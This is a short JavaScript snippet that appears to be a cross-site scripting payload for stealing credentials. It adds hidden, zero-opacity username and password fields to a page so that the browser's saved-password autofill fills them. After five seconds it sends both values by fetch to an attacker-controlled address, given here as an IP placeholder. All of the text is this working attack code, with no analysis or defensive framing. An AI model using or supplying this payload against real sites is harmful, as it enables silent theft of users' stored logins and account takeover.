var AttackerURL = "http://<ip_addr>";
let body = document.getElementsByTagName("body")[0];
// Username
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";
// Password
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";
// Extract
body.append(u);
body.append(p);
setTimeout(function(){
    fetch([AttackerURL, "/user/", u.value].join(''), {
    mode: 'no-cors'
});
    fetch([AttackerURL, "/pass/", p.value].join(''), {
    mode: 'no-cors'
});
}, 5000);
